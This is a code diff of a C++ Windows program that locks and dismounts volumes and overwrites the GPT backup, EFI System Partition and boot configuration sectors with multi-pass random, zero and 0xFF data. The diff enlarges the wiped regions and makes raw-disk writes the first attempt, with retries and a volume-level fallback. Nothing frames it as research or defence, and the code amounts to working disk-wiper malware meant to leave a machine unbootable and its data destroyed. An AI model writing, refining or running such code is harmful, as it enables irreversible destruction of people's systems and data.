@@ -209,9 +209,9 @@ int main() {
 
     const int SECTOR_SIZE = 512;
     const int SECTORS_TO_NUKE = 2048; // 1 MB
-    const int GPT_BACKUP_SECTORS = 256;
-    const int ESP_SECTORS = 100; // Extended
-    const int BCD_SECTORS = 5; // Sectors 10-14
+    const int GPT_BACKUP_SECTORS = 512;
+    const int ESP_SECTORS = 200; // 100 MB
+    const int BCD_SECTORS = 10; // Sectors 10-19
     BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
     if (!buffer) WriteError("Failed to allocate buffer", 0);
     BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
@@ -288,7 +288,7 @@ int main() {
         }
     }
 
-    // Nuke ESP and BCD (Volume first)
+    // Nuke ESP and BCD (Raw disk first)
     if (isGPT && bytesReturned > 0) {
         const GUID ESP_GUID = {0xC12A7328, 0xF81F, 0x11D2, {0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B}};
         LARGE_INTEGER espOffset = {0};
@@ -303,69 +303,11 @@ int main() {
         }
 
         if (espFound && espOffset.QuadPart >= 0 && espOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
-            // Try volume write first
+            // Try raw disk write first
             bool espSuccess = false;
-            wchar_t espVolumeName[50];
-            HANDLE hEspVolume = INVALID_HANDLE_VALUE;
-            HANDLE hFind = FindFirstVolumeW(espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t));
-            if (hFind != INVALID_HANDLE_VALUE) {
-                do {
-                    hEspVolume = CreateFileW(espVolumeName, GENERIC_READ | GENERIC_WRITE, 
-                                             FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
-                    if (hEspVolume != INVALID_HANDLE_VALUE) {
-                        for (int attempt = 0; attempt < 12; ++attempt) {
-                            if (LockVolume(hEspVolume, errorCode) && DismountVolume(hEspVolume, errorCode)) {
-                                for (int pass = 0; pass < 5; ++pass) {
-                                    if (pass == 0 || pass == 4) {
-                                        for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
-                                    } else if (pass == 1) {
-                                        ZeroMemory(buffer, SECTOR_SIZE * ESP_SECTORS);
-                                    } else if (pass == 2) {
-                                        memset(buffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
-                                    } else {
-                                        for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
-                                    }
-                                    if (!OverwriteSector(hEspVolume, {0}, buffer, SECTOR_SIZE * ESP_SECTORS, errorCode)) {
-                                        status[2].success = false;
-                                    }
-                                }
-                                LARGE_INTEGER bcdOffset;
-                                bcdOffset.QuadPart = 10LL * SECTOR_SIZE;
-                                if (bcdOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
-                                    for (int pass = 0; pass < 5; ++pass) {
-                                        if (pass == 0 || pass == 4) {
-                                            for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
-                                        } else if (pass == 1) {
-                                            ZeroMemory(buffer, SECTOR_SIZE * BCD_SECTORS);
-                                        } else if (pass == 2) {
-                                            memset(buffer, 0xFF, SECTOR_SIZE * BCD_SECTORS);
-                                        } else {
-                                            for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
-                                        }
-                                        if (!OverwriteSector(hEspVolume, bcdOffset, buffer, SECTOR_SIZE * BCD_SECTORS, errorCode)) {
-                                            status[3].success = false;
-                                        }
-                                    }
-                                } else {
-                                    status[3].success = false;
-                                }
-                                DeviceIoControl(hEspVolume, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
-                                espSuccess = status[2].success;
-                                break;
-                            }
-                            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
-                        }
-                        CloseHandle(hEspVolume);
-                        if (espSuccess) break;
-                    }
-                } while (FindNextVolumeW(hFind, espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t)));
-                FindVolumeClose(hFind);
-            }
-
-            // Fallback to raw disk write if volume fails
-            if (!espSuccess) {
-                for (int attempt = 0; attempt < 12; ++attempt) {
-                    if (LockVolume(hDisk, errorCode)) {
+            for (int attempt = 0; attempt < 12; ++attempt) {
+                if (LockVolume(hDisk, errorCode)) {
+                    if (DismountVolume(hDisk, errorCode)) {
                         for (int pass = 0; pass < 5; ++pass) {
                             if (pass == 0 || pass == 4) {
                                 for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
@@ -404,8 +346,75 @@ int main() {
                         }
                         DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
                         if (espSuccess) break;
+                    } else {
+                        status[2].success = false;
                     }
-                    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+                } else {
+                    status[2].success = false;
+                }
+                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+            }
+
+            // Fallback to volume write if raw disk fails
+            if (!espSuccess) {
+                wchar_t espVolumeName[50];
+                HANDLE hEspVolume = INVALID_HANDLE_VALUE;
+                HANDLE hFind = FindFirstVolumeW(espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t));
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do {
+                        hEspVolume = CreateFileW(espVolumeName, GENERIC_READ | GENERIC_WRITE, 
+                                                 FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+                        if (hEspVolume != INVALID_HANDLE_VALUE) {
+                            for (int attempt = 0; attempt < 12; ++attempt) {
+                                if (LockVolume(hEspVolume, errorCode) && DismountVolume(hEspVolume, errorCode)) {
+                                    for (int pass = 0; pass < 5; ++pass) {
+                                        if (pass == 0 || pass == 4) {
+                                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
+                                        } else if (pass == 1) {
+                                            ZeroMemory(buffer, SECTOR_SIZE * ESP_SECTORS);
+                                        } else if (pass == 2) {
+                                            memset(buffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
+                                        } else {
+                                            for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) buffer[j] = dis(gen);
+                                        }
+                                        if (!OverwriteSector(hEspVolume, {0}, buffer, SECTOR_SIZE * ESP_SECTORS, errorCode)) {
+                                            status[2].success = false;
+                                        }
+                                    }
+                                    LARGE_INTEGER bcdOffset;
+                                    bcdOffset.QuadPart = 10LL * SECTOR_SIZE;
+                                    if (bcdOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
+                                        for (int pass = 0; pass < 5; ++pass) {
+                                            if (pass == 0 || pass == 4) {
+                                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
+                                            } else if (pass == 1) {
+                                                ZeroMemory(buffer, SECTOR_SIZE * BCD_SECTORS);
+                                            } else if (pass == 2) {
+                                                memset(buffer, 0xFF, SECTOR_SIZE * BCD_SECTORS);
+                                            } else {
+                                                for (int j = 0; j < SECTOR_SIZE * BCD_SECTORS; ++j) buffer[j] = dis(gen);
+                                            }
+                                            if (!OverwriteSector(hEspVolume, bcdOffset, buffer, SECTOR_SIZE * BCD_SECTORS, errorCode)) {
+                                                status[3].success = false;
+                                            }
+                                        }
+                                    } else {
+                                        status[3].success = false;
+                                    }
+                                    DeviceIoControl(hEspVolume, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr);
+                                    espSuccess = status[2].success;
+                                    break;
+                                }
+                                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+                            }
+                            CloseHandle(hEspVolume);
+                            if (espSuccess) break;
+                        }
+                    } while (FindNextVolumeW(hFind, espVolumeName, sizeof(espVolumeName) / sizeof(wchar_t)));
+                    FindVolumeClose(hFind);
+                } else {
+                    status[2].success = false;
+                    status[3].success = false;
                 }
             }
         } else {
